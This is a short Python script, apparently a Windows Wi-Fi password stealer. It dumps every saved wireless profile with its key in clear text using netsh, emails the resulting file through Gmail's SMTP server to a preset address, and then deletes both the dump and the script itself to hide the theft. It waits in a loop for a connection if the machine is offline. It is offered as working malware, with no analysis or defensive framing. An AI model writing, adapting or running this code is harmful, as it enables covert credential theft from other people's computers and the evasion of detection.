import subprocess
import time
from urllib.request import urlopen
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def is_internet_connected():
    try:
        urlopen('http://www.google.com', timeout=1)
        return True
    except:
        return False

def send_mail():
    try:
        _from = " from email "
        to = ' to email '
        msg = MIMEMultipart()
        msg['_from'] = _from
        msg['To'] = to
        msg['Subject'] = "PC Wifi Configuration Password"
        body = "File contain wifi Password"
        msg.attach(MIMEText(body, 'plain'))
        filename = "network.conf"
        attachment = open(filename, "rb")
        py = MIMEBase('application', 'octet-stream')
        py.set_payload((attachment).read())
        encoders.encode_base64(py)
        py.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(py)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(_from, "  type password   ")
        text = msg.as_string()
        s.sendmail(_from, to, text)
        s.quit()
        print("Mail Send successfully")
        return True
    except:
        return False

if is_internet_connected() == True:
    subprocess.call("netsh wlan show profile name=* key=clear > network.conf",shell=True)
    print("Connected\nTry to sending mail")
    if send_mail() == True:
        subprocess.call("del network.conf", shell=True)
        print("File Deleted")
else:
    print("Not Connected")
    while True:
        if is_internet_connected() == True:
            subprocess.call("netsh wlan show profile name=* key=clear > network.conf",shell=True)
            if send_mail() == True:
                subprocess.call("del network.conf", shell=True)
                print("File Deleted")
                break
                
print("clearing logs")
subprocess.call("del wifi_password_extractor.py", shell=True)
print("logs cleared")
